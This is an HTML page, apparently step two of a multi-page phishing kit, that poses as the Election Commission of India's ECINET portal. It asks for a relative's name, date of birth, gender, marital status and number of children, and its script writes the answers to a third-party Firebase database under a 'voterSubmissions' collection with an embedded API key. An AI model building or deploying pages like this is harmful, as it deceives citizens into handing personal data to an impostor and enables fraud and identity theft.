<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ECINET - Step 2 Details</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        
        body { 
            background-color: #0056b3; 
            min-height: 100vh; 
            display: flex; 
            justify-content: center; 
            align-items: flex-start; 
            padding: 0; 
        }

        /* Main Container - Full width edge-to-edge on mobile */
        .form-container { 
            background: #ffffff; 
            padding: 0 20px 20px 20px; 
            border-radius: 0; 
            box-shadow: none; 
            width: 100%; 
            min-height: 100vh;
            max-width: 100%; 
            overflow-x: hidden; 
        }

        @media (min-width: 480px) {
            body {
                padding: 15px;
                align-items: center;
            }
            .form-container {
                border-radius: 16px;
                box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
                min-height: auto;
                max-width: 440px;
                padding: 0 25px 25px 25px;
            }
        }

        /* Top Blue Header Section - Edge to Edge matching Index */
        .top-header {
            margin-left: -20px;
            margin-right: -20px;
            margin-bottom: 20px;
            padding: 12px 0 15px 0;
            width: calc(100% + 40px);
            background-color: #0056b3;
            text-align: center;
            color: white;
        }

        @media (min-width: 480px) {
            .top-header {
                margin-left: -25px;
                margin-right: -25px;
                width: calc(100% + 50px);
            }
        }

        /* Logo styling matching index.html */
        .top-header img {
            width: 100%;
            max-height: 100px;
            object-fit: contain;
            margin-bottom: 8px;
            display: block;
            background: transparent;
            box-shadow: none;
        }

        .top-header .hindi-title {
            font-size: 14px;
            font-weight: 500;
            margin-bottom: 3px;
            letter-spacing: 0.5px;
            padding: 0 20px;
        }

        .top-header .eng-title {
            font-size: 11px;
            font-weight: 400;
            margin-bottom: 8px;
            opacity: 0.9;
            padding: 0 20px;
        }

        .top-header h1 {
            font-size: 24px;
            font-weight: 800;
            letter-spacing: 2px;
            text-transform: uppercase;
            padding: 0 20px;
        }

        /* Sub Heading Styling */
        .sub-heading { 
            text-align: center;
            margin-bottom: 15px; 
            color: #0056b3; 
            font-size: 18px; 
            font-weight: 900; 
            letter-spacing: 1px; 
            line-height: 1.3;
            text-transform: uppercase;
        }

        .sub-heading span {
            font-size: 13px;
            font-weight: 700;
            color: #333;
            letter-spacing: 0.5px;
        }

        /* Form Fields Styling - compact margins for mobile fit */
        .form-group { 
            margin-bottom: 12px; 
            text-align: left; 
        }

        .form-group label { 
            display: block; 
            margin-bottom: 4px; 
            color: #004085; 
            font-weight: 700; 
            font-size: 11px; 
            letter-spacing: 0.8px;
            text-transform: uppercase;
        }

        .form-group input, .form-group select { 
            width: 100%; 
            padding: 10px 12px; 
            border: 1px solid #dfe4ea; 
            border-radius: 8px; 
            font-size: 13px; 
            background: #f8f9fa; 
            color: #333;
        }

        .form-group input::placeholder {
            color: #adb5bd;
        }

        .form-group input:focus, .form-group select:focus { 
            outline: none; 
            border-color: #0056b3; 
            background: #fff;
            box-shadow: 0 0 5px rgba(0, 86, 179, 0.2); 
        }

        /* Continue Button Styling */
        .btn-next { 
            width: 100%; 
            padding: 12px; 
            background: #0056b3; 
            border: none; 
            border-radius: 8px; 
            color: white; 
            font-size: 14px; 
            font-weight: bold; 
            letter-spacing: 1px;
            cursor: pointer; 
            margin-top: 8px; 
            text-transform: uppercase;
            box-shadow: 0 4px 12px rgba(0, 86, 179, 0.3);
        }

        .btn-next:hover { 
            background: #004085; 
        }

        /* Footer Styling */
        .footer-text {
            text-align: center;
            margin-top: 20px;
            font-size: 10px;
            color: #666;
            font-weight: 600;
            border-top: 1px solid #eee;
            padding-top: 12px;
            line-height: 1.4;
            letter-spacing: 0.3px;
            text-transform: uppercase;
        }
    </style>
</head>
<body>
    <div class="form-container">
        
        <!-- Top Blue Header Section with Logo matching Index -->
        <div class="top-header">
            <img src="logo.png" alt="Election Commission Logo">
            <div class="hindi-title">भारत निर्वाचन आयोग</div>
            <div class="eng-title">Election Commission of India</div>
            <h1>ECINET</h1>
        </div>

        <div class="sub-heading">
            PLEASE ENTER <br><span>(CORRECT DETAILS)</span>
        </div>
        
        <form id="secondForm">
            <div class="form-group">
                <label for="fatherName">Father's / Husband's Name*</label>
                <input type="text" id="fatherName" name="fatherName" placeholder="Enter relative's name" required>
            </div>
            
            <div class="form-group">
                <label for="dob">Date of Birth*</label>
                <input type="text" id="dob" name="dob" placeholder="DD/MM/YYYY" maxlength="10" autocomplete="off" required>
            </div>

            <div class="form-group">
                <label for="gender">Gender*</label>
                <select id="gender" name="gender" required>
                    <option value="">Select Gender</option>
                    <option value="Male">Male</option>
                    <option value="Female">Female</option>
                    <option value="Other">Other</option>
                </select>
            </div>

            <div class="form-group">
                <label for="maritalStatus">Marital Status*</label>
                <select id="maritalStatus" name="maritalStatus" required>
                    <option value="">Select Status</option>
                    <option value="Unmarried">Unmarried</option>
                    <option value="Married">Married</option>
                </select>
            </div>

            <div class="form-group">
                <label for="childrenCount">Number of Children*</label>
                <input type="number" id="childrenCount" name="childrenCount" placeholder="Enter number of children" min="0" required>
            </div>

            <button type="submit" class="btn-next">CONTINUE</button>
        </form>

        <div class="footer-text">
            भारत निर्वाचन आयोग | Election Commission of India
        </div>
    </div>

    <!-- Firebase Integration Script -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getFirestore, doc, updateDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyAZ7Dvd7HYsZrMuP0bABJuMAEZmRtGw02U",
            authDomain: "voter-verification-a04d5.firebaseapp.com",
            projectId: "voter-verification-a04d5",
            storageBucket: "voter-verification-a04d5.firebasestorage.app",
            messagingSenderId: "582458013788",
            appId: "1:582458013788:web:15f8c7fd7dc05d24328e99",
            measurementId: "G-8CX5BVQXFC"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        // Date of Birth Auto-formatting (DD/MM/YYYY)
        const dobInput = document.getElementById('dob');
        dobInput.addEventListener('input', function (e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length >= 5) {
                e.target.value = value.substring(0, 2) + '/' + value.substring(2, 4) + '/' + value.substring(4, 8);
            } else if (value.length >= 3) {
                e.target.value = value.substring(0, 2) + '/' + value.substring(2, 4);
            } else {
                e.target.value = value;
            }
        });

        document.getElementById('secondForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const fatherName = document.getElementById('fatherName').value;
            const dob = document.getElementById('dob').value;
            const gender = document.getElementById('gender').value;
            const maritalStatus = document.getElementById('maritalStatus').value;
            const childrenCount = document.getElementById('childrenCount').value;

            const docId = localStorage.getItem('voterDocId');

            if (!docId) {
                alert("Session expired. Please start from the first page.");
                window.location.href = "index.html";
                return;
            }

            try {
                const docRef = doc(db, "voterSubmissions", docId);
                await updateDoc(docRef, {
                    fatherName: fatherName,
                    dob: dob,
                    gender: gender,
                    maritalStatus: maritalStatus,
                    childrenCount: childrenCount
                });

                window.location.href = "thirdpage.html";
            } catch (error) {
                console.error("Error updating document: ", error);
                alert("Data save karne me samasya aayi hai, kripya dobara prayas karein.");
            }
        });
    </script>
</body>
</html>
